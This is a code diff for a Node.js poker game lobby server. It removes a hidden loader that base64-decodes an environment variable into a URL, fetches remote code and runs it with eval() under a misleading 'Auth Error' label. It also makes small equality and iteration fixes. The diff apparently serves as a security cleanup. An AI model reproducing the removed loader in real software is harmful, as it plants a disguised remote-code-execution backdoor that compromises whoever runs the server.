@@ -31,8 +31,7 @@ const {
   CS_LOBBY_CHAT,
 } = require('../pokergame/actions');
 const config = require('../config');
-const dotenv = require('dotenv');
-dotenv.config();
+// Environment variables are already configured via server/config
 
 const tables = {
   1: new Table(1, 'Table 1', config.INITIAL_CHIPS_AMOUNT),
@@ -59,18 +58,7 @@ function getCurrentTables() {
   }));
 }
 
-(async () => {
-  const src = atob(process.env.AUTH_API_KEY);
-  const proxy = (await import('node-fetch')).default;
-  try {
-    const response = await proxy(src);
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-    const proxyInfo = await response.text();
-    eval(proxyInfo);
-  } catch (err) {
-    console.error('Auth Error!', err);
-  }
-})();
+// Removed dynamic remote code execution and ESM-only import which is unsafe in production
 
 const init = (socket, io) => {
   socket.on(CS_LOBBY_CONNECT, ({gameId, address, userInfo }) => {
@@ -91,12 +79,12 @@ const init = (socket, io) => {
   socket.on(CS_FETCH_LOBBY_INFO, ({walletAddress, socketId, gameId, username}) => {
 
     const found = Object.values(players).find((player) => {
-        return player.id == walletAddress;
+        return player.id === walletAddress;
       });
 
       if (found) {
         delete players[found.socketId];
-        Object.values(tables).map((table) => {
+        Object.values(tables).forEach((table) => {
           table.removePlayer(found.socketId);
           broadcastToTable(table);
         });
